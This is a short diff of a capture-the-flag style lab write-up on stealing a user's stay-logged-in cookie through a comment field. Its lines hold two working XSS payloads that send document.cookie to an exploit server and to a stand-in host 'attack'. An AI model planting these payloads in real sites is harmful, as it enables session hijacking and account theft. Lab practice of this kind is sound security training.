@@ -11,14 +11,14 @@ This gave a clear hint of how we had to get carlos' stay-logged-in cookie, by le
 
 
 submit the comment
-```
+```javascript
 <img src=x onerror="window.location.href='https://exploit-LAB_ID.exploit-server.net/log'+document.cookie;">
 
-OR USE ANY XSS PAYLOAD 4 COOKIE THEFT EVEN
+## OR USE ANY XSS PAYLOAD 4 COOKIE THEFT EVEN
 
 <script>fetch('http://attack/'+document.cookie);</script>
 
-ALL THAT MATTERS IS OBTAINING THE COOKIE
+## ALL THAT MATTERS IS OBTAINING THE COOKIE
 ```
 fill the others as pleased.
 
